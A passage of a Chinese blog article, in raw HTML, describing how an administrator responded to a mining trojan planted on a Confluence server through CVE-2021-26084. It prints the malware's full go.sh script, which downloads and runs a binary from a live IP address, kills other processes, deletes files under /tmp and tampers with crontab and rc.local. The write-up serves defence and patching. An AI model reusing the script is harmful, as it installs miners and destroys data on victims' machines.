data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38OCiaPVu6sZVUYmC6tWtFmJWnZvcq3gfmuiaCpJiauE20W716q1DbvTCyiaoVljN2zfmyxu2zEldyib0Q/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"554\"/></p><h3 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 16px;color: green;\">2.3 \u68c0\u67e5\u7f51\u7edc\u8fde\u63a5\u72b6\u6001</h3><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u901a\u8fc7netstat\u547d\u4ee4\u67e5\u770b\u7f51\u7edc\u8fde\u63a5\u72b6\u6001\uff0c\u5176\u4e2d\u6709\u4e00\u6761\u4e0eIDS\u548c\u6001\u52bf\u611f\u77e5\u4e0a\u5747\u53d1\u73b0\u7684\u77ff\u6c60\u8fde\u63a5IP\u76f8\u540c\u3002</p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><img data-ratio=\"0.09927797833935018\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38OCiaPVu6sZVUYmC6tWtFmJJSf9GdUHjc2iauYevjcibvnyN4nezicHODEhZLN0HhcnecicTIibylCjUBg/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"554\"/></p><h3 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 16px;color: green;\">2.4 \u67e5\u770b\u8d44\u6e90\u5360\u7528\u60c5\u51b5</h3><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u8f93\u5165top\u547d\u4ee4\uff0c\u6709\u591a\u4e2aconfluence\u7528\u6237\u7684\u8fdb\u7a0b\uff0c\u5176\u4e2dsolrd\u8fdb\u7a0b\u660e\u663e\u5f02\u5e38\uff0c</p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><img data-ratio=\"0.8249097472924187\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38OCiaPVu6sZVUYmC6tWtFmJ9TAqdIWpjbYdmpLHcoKBPKy1wZPibx7fIic7wlX1NjQ1DRJXuVShaqSg/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"554\"/></p><h3 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 16px;color: green;\">2.5 \u8ba1\u5212\u4efb\u52a1</h3><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u4f7f\u7528\u547d\u4ee4crontab -l -u confluence\u67e5\u770b\u8ba1\u5212\u4efb\u52a1\uff0c\u53d1\u73b0\u6709\u4e2a\u81ea\u52a8\u4e0b\u8f7d\u7684\u4efb\u52a1</p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><img data-ratio=\"0.08\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38OCiaPVu6sZVUYmC6tWtFmJYDnUdLEPgN5SPqe5lBvuiaeIwNh4H6Ch09rjAI9J05goLGcPB8t53qA/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"475\"/></p><h3 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 16px;color: green;\">2.6 \u53ef\u7591\u6587\u4ef6\u5b9a\u4f4d</h3><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u901a\u8fc7\u5bf9\u53ef\u7591\u8fdb\u7a0bsolrd\u7684\u641c\u7d22\u53d1\u73b0\uff0c\u5728/tmp/.solrd\u8def\u5f84\u4e0b\uff0c\u6709\u591a\u4e2a\u75c5\u6bd2\u6587\u4ef6\uff0c\u5176\u4e2d\u8fde\u63a5\u77ff\u6c60\u7684\u6587\u4ef6\u622a\u56fe\u5982\u4e0b\uff1a</p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><img data-ratio=\"0.427797833935018\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38OCiaPVu6sZVUYmC6tWtFmJfrB9ErsFSib0wICpic2kLy5pGDRUUPpl2Qx83WcJhWO2DZlIvub31ZeA/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"554\"/></p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u5e76\u6709go.sh\u6587\u4ef6\uff0c\u6e90\u7801\u5982\u4e0b\uff1a</p><section class=\"code-snippet__fix code-snippet__js\"><ul class=\"code-snippet__line-index code-snippet__js\"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class=\"code-snippet__js\" data-lang=\"bash\"><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__meta\">#!/bin/sh</span></span></code><code><span class=\"code-snippet_outer\">myName=<span class=\"code-snippet__string\">'.go.sh'</span></span></code><code><span class=\"code-snippet_outer\">sName=<span class=\"code-snippet__string\">'bin/java'</span></span></code><code><span class=\"code-snippet_outer\">mName=<span class=\"code-snippet__string\">'javac'</span></span></code><code><span class=\"code-snippet_outer\">dlUrl=<span class=\"code-snippet__string\">'http://45.118.135.99:8881/'</span></span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__function\"><span class=\"code-snippet__title\">downloader</span></span> () {</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">if</span> <span class=\"code-snippet__built_in\">command</span> -v wget &amp;&gt; /dev/null; <span class=\"code-snippet__keyword\">then</span></span></code><code><span class=\"code-snippet_outer\">wget <span class=\"code-snippet__variable\">$1</span> -O <span class=\"code-snippet__variable\">$2</span> </span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">elif</span> <span class=\"code-snippet__built_in\">command</span> -v curl &amp;&gt; /dev/null; <span class=\"code-snippet__keyword\">then</span></span></code><code><span class=\"code-snippet_outer\">curl <span class=\"code-snippet__variable\">$1</span> -o <span class=\"code-snippet__variable\">$2</span></span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">else</span></span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">if</span> <span class=\"code-snippet__built_in\">test</span> <span class=\"code-snippet__string\">\"`python -c \"</span>import sys; <span class=\"code-snippet__built_in\">print</span>(sys.version_info[0])<span class=\"code-snippet__string\">\"`\"</span> = <span class=\"code-snippet__string\">\"3\"</span> ; <span class=\"code-snippet__keyword\">then</span></span></code><code><span class=\"code-snippet_outer\">python -c <span class=\"code-snippet__string\">\"from urllib.request import urlopen; u = urlopen('\"</span><span class=\"code-snippet__variable\">$1</span><span class=\"code-snippet__string\">\"'); localFile = open('\"</span><span class=\"code-snippet__variable\">$2</span><span class=\"code-snippet__string\">\"', 'wb'); localFile.write(u.read()); localFile.close()\"</span></span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">else</span></span></code><code><span class=\"code-snippet_outer\">python -c <span class=\"code-snippet__string\">\"from urllib import urlopen; u = urlopen('\"</span><span class=\"code-snippet__variable\">$1</span><span class=\"code-snippet__string\">\"'); localFile = open('\"</span><span class=\"code-snippet__variable\">$2</span><span class=\"code-snippet__string\">\"', 'wb'); localFile.write(u.read()); localFile.close()\"</span></span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">fi</span></span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">fi</span></span></code><code><span class=\"code-snippet_outer\">chmod +x <span class=\"code-snippet__variable\">$2</span></span></code><code><span class=\"code-snippet_outer\">}</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__function\"><span class=\"code-snippet__title\">killer</span></span>() {</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">if</span> <span class=\"code-snippet__built_in\">test</span> <span class=\"code-snippet__string\">\"<span class=\"code-snippet__variable\">$(id -u)</span>\"</span> -ne <span class=\"code-snippet__string\">\"0\"</span></span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">then</span></span></code><code><span class=\"code-snippet_outer\">ps aux | grep -v <span class=\"code-snippet__variable\">$mName</span> | grep -v <span class=\"code-snippet__variable\">$sName</span> | grep -v <span class=\"code-snippet__variable\">$myName</span> | awk <span class=\"code-snippet__string\">'{print $2}'</span> | <span class=\"code-snippet__keyword\">while</span> <span class=\"code-snippet__built_in\">read</span> procid</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">do</span></span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__built_in\">kill</span> -9 <span class=\"code-snippet__variable\">$procid</span></span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">done</span></span></code><code><span class=\"code-snippet_outer\">rm -rf /tmp/.*</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">else</span></span></code><code><span class=\"code-snippet_outer\">ps aux | grep -v <span class=\"code-snippet__variable\">$mName</span> | grep -v <span class=\"code-snippet__variable\">$sName</span> | grep -v <span class=\"code-snippet__variable\">$myName</span> | awk <span class=\"code-snippet__string\">'{if($3&gt;30.0) print $2}'</span> | <span class=\"code-snippet__keyword\">while</span> <span class=\"code-snippet__built_in\">read</span> procid</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">do</span></span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__built_in\">kill</span> -9 <span class=\"code-snippet__variable\">$procid</span></span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">done</span></span></code><code><span class=\"code-snippet_outer\">pkill -9 python</span></code><code><span class=\"code-snippet_outer\">pkill -f cryptonight</span></code><code><span class=\"code-snippet_outer\">pkill -9 perl</span></code><code><span class=\"code-snippet_outer\">rm -rf /tmp/.*</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__built_in\">echo</span> <span class=\"code-snippet__string\">\"\"</span> &gt;&gt; /etc/crontab</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__built_in\">echo</span> <span class=\"code-snippet__string\">\"exit 0\"</span> &gt;&gt; /etc/rc.local</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">fi</span></span></code><code><span class=\"code-snippet_outer\">}</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__function\"><span class=\"code-snippet__title\">runer</span></span>() {</span></code><code><span class=\"code-snippet_outer\">downloader <span class=\"code-snippet__variable\">$dlUrl</span>/codeR /tmp/<span class=\"code-snippet__variable\">$mName</span></span></code><code><span class=\"code-snippet_outer\">chmod +x /tmp/<span class=\"code-snippet__variable\">$mName</span></span></code><code><span class=\"code-snippet_outer\">/tmp/<span class=\"code-snippet__variable\">$mName</span> &amp;&amp; rm -f /tmp/<span class=\"code-snippet__variable\">$mName</span></span></code><code><span class=\"code-snippet_outer\">}</span></code><code><span class=\"code-snippet_outer\">ps aux | grep -v <span class=\"code-snippet__variable\">$mName</span> | grep -v <span class=\"code-snippet__variable\">$sName</span> | awk <span class=\"code-snippet__string\">'{if($3&gt;30.0) print $2}'</span> | <span class=\"code-snippet__keyword\">while</span> <span class=\"code-snippet__built_in\">read</span> procid</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">do</span></span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__built_in\">kill</span> -9 <span class=\"code-snippet__variable\">$procid</span></span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">done</span></span></code><code><span class=\"code-snippet_outer\">runer</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">while</span> <span class=\"code-snippet__literal\">true</span>; <span class=\"code-snippet__keyword\">do</span></span></code><code><span class=\"code-snippet_outer\">sleep 3</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">if</span> <span class=\"code-snippet__built_in\">test</span> <span class=\"code-snippet__string\">\"<span class=\"code-snippet__variable\">$(ps -eo pid,command | grep $mName | grep -v grep | head -n 1 | awk '{print $1}')</span>\"</span> -ne <span class=\"code-snippet__string\">\"0\"</span>; <span class=\"code-snippet__keyword\">then</span></span></code><code><span class=\"code-snippet_outer\">killer</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">else</span></span></code><code><span class=\"code-snippet_outer\">runer</span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">fi</span></span></code><code><span class=\"code-snippet_outer\"><span class=\"code-snippet__keyword\">done</span></span></code></pre></section><h3 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 16px;color: green;\">2.7 \u6728\u9a6c\u67e5\u6740</h3><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">9\u67083\u65e5\u4e0a\u5348\uff0c\u5220\u9664\u4e0a\u8ff0\u5df2\u77e5\u7684\u8fdb\u7a0b\u3001\u6587\u4ef6\u3001\u8ba1\u5212\u4efb\u52a1\uff0c\u5e76\u89c2\u5bdf\u534a\u5929\uff0c\u6682\u65f6\u672a\u518d\u73b0\u5f02\u5e38\u3002</p><h3 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 16px;color: green;\">2.8 \u6b7b\u7070\u590d\u71c3</h3><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">9\u67086\u65e5\uff08\u5468\u4e00\uff09\u4e00\u5927\u65e9\u5230\u5355\u4f4d\u5148\u5de1\u68c0\u4e00\u904d\u5b89\u5168\u8bbe\u5907\uff0c\u53d1\u73b0confluence\u670d\u52a1\u5668\u53c8\u4e2d\u6728\u9a6c\u4e86\uff0c\u800c\u4e14\u8fd9\u56de\u5a01\u80c1\u4e8b\u4ef6\u4e5f\u591a\u4e86\uff0c\u5305\u62ecDDoS\u3001\u77ff\u6c60\u8fde\u63a5\u3001\u516c\u5171\u77ff\u6c60\u3001\u6076\u610f\u8f6f\u4ef6\u548c\u50f5\u5c38\u7f51\u7edc\uff0c\u67e5\u770b\u5173\u8054\u5b9e\u4f53\u9ad8\u8fbe12\u4e2aIP/\u57df\u540d\uff0c\u8bf4\u660e\u8fd8\u53ef\u80fd\u4e0d\u6b62\u4e00\u6ce2\u4eba\u5e72\u7684\u3002</p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><img data-ratio=\"0.26714801444043323\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38OCiaPVu6sZVUYmC6tWtFmJO8eJ38VgOuvnevUB8KOQXHFBk0DJhBzjeGhjZpIQVfjY20IWQr45Tw/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"554\"/></p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u67e5\u770b\u65e5\u5fd7\u8be6\u60c5\uff0c\u518d\u6b21\u88ab\u690d\u5165\u6728\u9a6c\u7684\u65f6\u95f4\u662f9\u67084\u65e5\uff08\u5468\u516d\uff09\u665a\u4e0a21\u70b9\u3002</p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><img data-ratio=\"0.13898916967509026\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38OCiaPVu6sZVUYmC6tWtFmJYeG3vFLdEcyIpUgjQQKNucGDAJX8mFpCNpE5bjf5NUcgT99shqqaPw/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"554\"/></p><h3 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 16px;color: green;\">2.9 Confluence\u6f0f\u6d1e\u4fe1\u606f\u518d\u6b21\u67e5\u8be2</h3><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u6487\u5f00\u53e3\u7891\u4e0d\u600e\u4e48\u5730\u7684*\u5ea6\uff0c\u7528\u5176\u4ed6\u641c\u7d22\u5f15\u64ce\u518d\u6b21\u641c\u7d22confluence\u6f0f\u6d1e\u76f8\u5173\u4fe1\u606f\uff0c\u53d1\u73b0\u57288\u670826\u65e5\u56fd\u5185\u5b89\u5168\u5382\u5546360\u3001\u7eff\u76df\u7b49\u5747\u6709\u76f8\u5173\u6f0f\u6d1e\u516c\u544a\u3002</p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><img data-ratio=\"0.6263537906137184\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38OCiaPVu6sZVUYmC6tWtFmJd9OnBQ5N0SGMvaibibmiab7QanyJGmyZrJ2E1EdsG2Uicaszu7oriavblRw/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"554\"/></p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><img data-ratio=\"0.17870036101083034\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38OCiaPVu6sZVUYmC6tWtFmJhQly8iagibeqx0zXlcTXrNCR8kPO9Tu0TPxia0y0yVzRypicKCUK3gaDbw/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"554\"/></p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u5f53\u7136\uff0cAtlassian\u6700\u5148\u5728\u5176\u5b98\u7f51\u4e0a\u4e5f\u516c\u544a\u4e86\u8be5\u6f0f\u6d1e\uff0c\u5e76\u4e14\u5df2\u7ecf\u53d1\u5e03\u4e86\u4fee\u590d\u540e\u7684\u65b0\u7248\u672c\u3002</p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><img data-ratio=\"1.1531531531531531\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38OCiaPVu6sZVUYmC6tWtFmJ1rnVylyWgQSicKNibuSluWF0GxHZMcnpDnSLebyFibLLI9noZcIHSB3vw/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"222\"/></p><h3 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 16px;color: green;\">2.10 \u65ad\u5f00\u4e92\u8054\u7f51</h3><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u7531\u4e8e\u662f\u8fdc\u7a0b\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u60f3\u4e0a\u4f20\u4ec0\u4e48\u4ee3\u7801\u5c31\u4e0a\u4f20\u4ec0\u4e48\u4ee3\u7801\uff0c\u5982\u679c\u4f20\u4e2a\u52d2\u7d22\u75c5\u6bd2\u90a3\u5c31\u9ebb\u70e6\u5927\u4e86\uff0c\u679c\u65ad\u65ad\u5f00\u4e92\u8054\u7f51\u8fde\u63a5\uff0c\u514d\u5f97\u88ab\u8fdb\u4e00\u6b65\u653b\u51fb\u3002</p><h3 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 16px;color: green;\">2.11 Confluence\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c</h3><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u8054\u7cfbAtlassian\u4ee3\u7406\u5546\u5347\u7ea7confluence\u5230\u6700\u65b0\u7248\u672c\uff0c\u5e76\u518d\u6b21\u6e05\u7406\u6728\u9a6c\uff0c\u5305\u62ec\u76f8\u5173\u8fdb\u7a0b\u3001\u6587\u4ef6\u3001\u8ba1\u5212\u4efb\u52a1\u7b49\u3002</p><h2 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 18px;border-bottom: 1px solid rgb(238, 238, 238);color: black;\">3 \u4e8b\u4ef6\u603b\u7ed3</h2><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><strong>\u901a\u8fc7\u672c\u6b21confluence\u6728\u9a6c\u7684\u5904\u7406\uff0c\u6709\u4ee5\u4e0b\u51e0\u70b9\u5fc3\u5f97\u4f53\u4f1a\uff1a</strong></p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;color: rgb(119, 117, 117) !important;\"><span style=\"color: rgb(0, 0, 0);\">\u7531\u4e8eCVE-2021-26084\u662f\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u7684\u98ce\u9669\u7ea7\u522b\u65e0\u987b\u8d58\u8ff0\uff0c\u4e00\u5b9a\u4f1a\u6709\u5f88\u591a\u9ed1\u4ea7\u56e2\u961f\u5728\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u6240\u4ee5\u6bcf\u4e2a\u7528\u6237\u88ab\u9ed1\u7684\u75c7\u72b6\u5dee\u5f02\u6027\u4f1a\u5f88\u5927\uff0c\u770b\u5230\u8fd9\u7bc7\u6587\u7ae0\u7684\u7528\u6237\u5982\u679c\u60a8\u516c\u53f8\u6709\u7528confluence\u4e00\u5b9a\u7b2c\u4e00\u65f6\u95f4\u5347\u7ea7\u5230\u6700\u65b0\u7248\uff0c\u8fd9\u4e5f\u6211\u662f\u5199\u8fd9\u7bc7\u6587\u7ae0\u7684\u521d\u8877\u3002</span></p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;color: rgb(119, 117, 117) !important;\"><span style=\"color: rgb(0, 0, 0);\">\u7c7b\u4f3c\u6001\u52bf\u611f\u77e5\u3001IDS\u7b49\u7684\u5b89\u5168\u8bbe\u5907\u662f\u5f88\u6709\u5fc5\u8981\u7684\uff0c\u56e0\u4e3a\u5b83\u80fd\u8ba9\u4f60\u7b2c\u4e00\u65f6\u95f4\u638c\u63e1\u5185\u7f51\u7684\u5b89\u5168\u60c5\u51b5\uff0c\u4e0d\u9700\u8981\u518d\u82b1\u66f4\u591a\u7684\u65f6\u95f4\u53bb\u6392\u67e5\u5f02\u5e38\u60c5\u51b5\uff0c\u4e3a\u5e94\u6025\u54cd\u5e94\u4e89\u53d6\u66f4\u591a\u7684\u5b9d\u8d35\u65f6\u95f4\u3002</span></p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;color: rgb(119, 117, 117) !important;\"><span style=\"color: rgb(0, 0, 0);\">\u5982\u679c\u6709\u6761\u4ef6\uff0c\u53ef\u4ee5\u6839\u636e\u81ea\u8eab\u7684\u4e1a\u52a1\u5b9a\u5236\u5a01\u80c1\u60c5\u62a5\uff0c\u56e0\u4e3a\u5a01\u80c1\u60c5\u62a5\u5b9e\u5728\u592a\u591a\uff0c\u5b89\u5168\u8d1f\u8d23\u4eba\u5e73\u65f6\u7684\u4e8b\u60c5\u4e5f\u4e0d\u5c11\uff0c\u6d77\u91cf\u7684\u5a01\u80c1\u60c5\u62a5\u5b9e\u5728\u770b\u4e0d\u8fc7\u6765\uff0c\u53ca\u65f6\u638c\u63e1\u6f0f\u6d1e\u4fe1\u606f\uff0c\u4e3a\u5e94\u6025\u54cd\u5e94\u4e89\u53d6\u66f4\u591a\u65f6\u95f4\u3002</span></p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;color: rgb(119, 117, 117) !important;\"><span style=\"color: rgb(0, 0, 0);\">\u7ffb\u5f00\u516c\u53f8\u7684\u5408\u540c\u6837\u672c\uff0c\u201c\u5982\u679c\u4e59\u65b9\u63d0\u4f9b\u7684\u4ea7\u54c1\u6709\u91cd\u5927\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u5e94\u7b2c\u4e00\u65f6\u95f4\u4e66\u9762\u901a\u77e5\u7532\u65b9\uff0c\u5e76\u63d0\u4f9b\u76f8\u5e94\u7684\u4fee\u590d\u65b9\u6848\uff0c\u5982\u56e0\u4e59\u65b9\u7684\u758f\u5ffd\u7ed9\u7532\u65b9\u9020\u6210\u91cd\u5927\u7ecf\u6d4e\u635f\u5931\uff0c\u7532\u65b9\u6709\u6743\u5411\u4e59\u65b9\u7d22\u8d54\u201d\uff0c\u5982\u679c\u6ca1\u6709\u8fd9\u6837\u7684\u4e00\u6761\uff0c\u4e00\u5b9a\u8981\u52a0\u4e0a\u3002</span></p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;color: rgb(119, 117, 117) !important;\"><span style=\"color: rgb(0, 0, 0);\">\u672c\u6b21confluence\u6f0f\u6d1e\uff0c\u5f53\u6211\u4eec\u544a\u77e5Atlassian\u4ee3\u7406\u5546confluence\u6709\u6f0f\u6d1e\u65f6\uff0c\u4ed6\u4eec\u7684\u7b54\u590d\u662f\u201c\u8fd9\u4e9b\u662f2019\u5e74\u7684\u6f0f\u6d1e\uff0c\u65e9\u5df2\u7ecf\u4fee\u590d\u4e86\u201d\uff0c\u8bf4\u660e\u5728\u4e8b\u53d1\u65f6\uff0c\u4ed6\u4eec\u4e5f\u6ca1\u5173\u6ce8\u5230Atlassian\u53d1\u5e03\u7684\u9ad8\u5371\u6f0f\u6d1e\u3002\u5f53\u6211\u4eec\u544a\u77e5\u5bf9\u65b9\u6700\u65b0\u7684\u6f0f\u6d1e\u65f6\uff0c\u4ed6\u4eec\u5e76\u4e0d\u662f\u7acb\u5373\u7ed9\u4f60\u5347\u7ea7\uff0c\u800c\u662f\u95ee\u5408\u540c\u5230\u671f\u65e5\u662f\u4ec0\u4e48\u65f6\u5019\uff0c\u5982\u679c\u8fc7\u671f\u4e86\u65e0\u6cd5\u76f4\u63a5\u5347\u7ea7\u3002</span></p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;color: rgb(119, 117, 117) !important;\"><span style=\"color: rgb(0, 0, 0);\">\u614e\u7528*\u5ea6\uff0c\u614e\u7528\uff0c\u614e\u7528\uff0c\u5982\u679c\u6211\u5728\u5468\u4e94\u5c31\u53d1\u73b0confluence\u7684\u6f0f\u6d1e\u4fe1\u606f\uff0c\u6211\u5468\u4e94\u7b2c\u4e00\u65f6\u95f4\u5c31\u80fd\u5904\u7406\u5b8c\u6bd5\uff0c\u5047\u5982\u540e\u9762\u5468\u516d\u665a\u4e0a\u88ab\u690d\u5165\u7684\u662f\u52d2\u7d22\u75c5\u6bd2\u4e86\uff0c\u60f3\u60f3\u90fd\u540e\u6015\u3002</span></p><section data-role=\"outer\" style='white-space: normal;max-width: 100%;font-family: -apple-system-font, BlinkMacSystemFont, \"Helvetica Neue\", \"PingFang SC\", \"Hiragino 